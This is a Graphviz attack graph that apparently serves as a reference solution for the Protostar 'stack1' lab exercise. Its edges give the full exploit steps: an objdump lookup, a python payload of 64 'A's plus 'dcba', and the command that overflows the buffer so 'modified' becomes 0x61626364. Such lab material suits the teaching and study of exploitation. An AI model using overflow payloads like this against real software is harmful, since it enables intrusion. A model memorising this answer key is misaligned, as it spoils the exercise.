digraph AttackGraph {
  rankdir=LR;
  graph [fontsize=12, labelloc="t", label="Attack Graph (reference) - Protostar Stack One"];
  node [shape=box, style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica"];
  edge [color="#555555", fontname="Helvetica", fontsize=10];

  start [shape="box", style="rounded,filled", fillcolor="#EAF3FF", color="#444444", fontname="Helvetica", label="Start"];
  node0 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="Target value identified"];
  node1 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="Payload layout prepared"];
  node2 [shape="box", style="rounded,filled", fillcolor="#E8FFE8", color="#2E7D32", fontname="Helvetica", penwidth="2", label="modified set to 0x61626364"];

  start -> node0 [color="#555555", fontname="Helvetica", fontsize="10", label="objdump -d /opt/protostar/bin/stack1 | grep -i modified"];
  node0 -> node1 [color="#555555", fontname="Helvetica", fontsize="10", label="python -c 'print \"A\"*64 + \"dcba\"'"];
  node1 -> node2 [color="#555555", fontname="Helvetica", fontsize="10", label="/opt/protostar/bin/stack1 $(python -c 'print \"A\"*64 + \"dcba\"')"];
}
